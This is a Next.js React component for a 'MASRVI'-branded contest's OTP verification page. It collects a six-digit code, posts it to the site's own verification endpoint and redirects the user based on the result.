import { useState, useEffect } from 'react';
import Head from 'next/head';
import Link from 'next/link';
import { useRouter } from 'next/router';
import { useTranslation } from 'react-i18next';
import axios from 'axios';
import ErrorModal from '@/components/ErrorModal';
import { useContest } from '@/context/ContestContext';

export default function OtpPage() {
  const { t } = useTranslation();
  const router = useRouter();
  const { phone, entryCode, clearRegistration } = useContest();
  const [otpCode, setOtpCode] = useState(['', '', '', '', '', '']);
  const [loading, setLoading] = useState(false);
  const [showError, setShowError] = useState(false);

  useEffect(() => {
    if (!phone || !entryCode) {
      router.replace('/register');
    }
  }, [phone, entryCode, router]);

  const handleOtpChange = (index, value) => {
    if (value.length > 1) return;
    const newOtp = [...otpCode];
    newOtp[index] = value.replace(/\D/g, '');
    setOtpCode(newOtp);

    // Auto-focus next input
    if (value && index < 5) {
      const nextInput = document.getElementById(`otp-${index + 1}`);
      nextInput?.focus();
    }
  };

  const handleKeyDown = (index, e) => {
    if (e.key === 'Backspace' && !otpCode[index] && index > 0) {
      const prevInput = document.getElementById(`otp-${index - 1}`);
      prevInput?.focus();
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    const code = otpCode.join('');
    if (code.length !== 6) return;

    setLoading(true);

    try {
      const { data } = await axios.post('/api/verify-otp', {
        phone,
        entryCode,
        otpCode: code,
      });

      if (data.success) {
        router.push('/share');
      } else {
        setShowError(true);
      }
    } catch {
      setShowError(true);
    } finally {
      setLoading(false);
    }
  };

  const handleErrorClose = () => {
    setShowError(false);
    clearRegistration();
    router.push('/register');
  };

  // Mask phone number
  const maskedPhone = phone ? `+222 ${phone.slice(0, 2)}******${phone.slice(-1)}` : '';

  if (!phone || !entryCode) return null;

  return (
    <>
      <Head>
        <title>MASRVI - {t('otp.title')}</title>
      </Head>

      <main className="min-h-[calc(100vh-64px)] flex flex-col bg-gray-50">
        {/* Back Button */}
        <div className="px-4 py-4">
          <Link
            href="/register"
            className="inline-flex items-center gap-2 text-gray-600 hover:text-gray-900 transition-colors"
          >
            <span className="rtl:rotate-180">&#10094;</span>
            <span>{t('registration.back')}</span>
          </Link>
        </div>

        <div className="flex-1 flex items-center justify-center px-4 py-8">
          <div className="w-full max-w-md">
            <div className="bg-white rounded-3xl shadow-xl border border-gray-100 p-8">
              {/* Phone Icon */}
              <div className="text-center mb-8">
                <div className="w-24 h-24 mx-auto mb-6 rounded-full bg-gradient-to-br from-amber-100 to-amber-200 flex items-center justify-center">
                  <div className="w-16 h-16 rounded-full border-4 border-amber-400 flex items-center justify-center">
                    <svg className="w-8 h-8 text-amber-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
                    </svg>
                  </div>
                </div>
                <h1 className="text-2xl font-bold text-gray-900 mb-2">{t('otp.title')}</h1>
                <p className="text-gray-600 mb-2">{t('otp.subtitle')}</p>
                <p className="text-gray-500 text-sm">
                  Entrez le code a six chiffres que vous avez recu au:
                </p>
                <p className="text-primary-600 font-medium ltr-input">{maskedPhone}</p>
              </div>

              <form onSubmit={handleSubmit} className="space-y-8">
                {/* OTP Input Boxes */}
                <div className="flex justify-center gap-3" dir="ltr">
                  {otpCode.map((digit, index) => (
                    <input
                      key={index}
                      id={`otp-${index}`}
                      type="tel"
                      inputMode="numeric"
                      maxLength={1}
                      value={digit}
                      onChange={(e) => handleOtpChange(index, e.target.value)}
                      onKeyDown={(e) => handleKeyDown(index, e)}
                      className="w-12 h-14 text-center text-xl font-bold border border-gray-200 rounded-xl focus:ring-2 focus:ring-primary-500 focus:border-primary-500 outline-none transition bg-gray-50"
                    />
                  ))}
                </div>

                <div className="space-y-3">
                  <button
                    type="submit"
                    disabled={loading || otpCode.join('').length !== 6}
                    className="w-full py-4 bg-gray-400 hover:bg-primary-500 disabled:bg-gray-400 text-white font-bold rounded-2xl transition-all shadow-md text-lg"
                  >
                    {loading ? '...' : t('otp.verify')}
                  </button>

                  <button
                    type="button"
                    onClick={() => router.push('/register')}
                    className="w-full py-4 bg-white border border-gray-200 text-gray-700 font-bold rounded-2xl hover:bg-gray-50 transition-all text-lg"
                  >
                    {t('otp.cancel')}
                  </button>
                </div>
              </form>
            </div>
          </div>
        </div>
      </main>

      <ErrorModal
        isOpen={showError}
        title={t('errors.title')}
        message={t('errors.invalid_otp')}
        buttonText={t('errors.retry')}
        onClose={handleErrorClose}
      />
    </>
  );
}
